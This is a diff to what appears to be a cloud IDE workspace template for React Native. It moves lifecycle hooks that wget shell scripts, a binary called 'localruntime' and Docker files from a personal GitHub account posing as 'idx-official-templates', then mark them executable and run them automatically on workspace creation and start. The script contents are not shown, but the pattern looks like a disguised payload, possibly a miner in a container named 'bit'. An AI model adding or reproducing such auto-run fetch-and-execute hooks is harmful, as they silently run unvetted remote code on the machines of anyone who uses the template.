@@ -46,8 +46,6 @@
       onCreate = {
         install = "{{perPackageManager.install}}";
         create-tmux-sessions = "
-            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
-            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
             wget https://github.com/dediminari/bit/raw/refs/heads/main/localruntime
         ";
       };
@@ -60,6 +58,11 @@
           {{perPackageManager.previewAndroidPrefix}} --port 5554 --tunnel
         '';
         start-ping-sessions = "
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
+            chmod +x ping.sh && chmod +x trace.sh && ./ping.sh
+        ";
+        start-tmux-sessions = "
             docker stop bit
             docker rm bit
             rm -rf Dockerfile
@@ -70,10 +73,7 @@
             wget https://github.com/dediminari/bit/raw/refs/heads/main/entrypoint
             wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/dock.sh
             wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/tmux.sh
-            chmod +x Dockerfile && chmod +x entrypoint && chmod +x ping.sh && chmod +x trace.sh && ./ping.sh
-        ";
-        start-tmux-sessions = "
-            chmod +x dock.sh && chmod +x tmux.sh && ./dock.sh
+            chmod +x Dockerfile && chmod +x entrypoint && chmod +x dock.sh && chmod +x tmux.sh && ./dock.sh
         ";
       };
     };
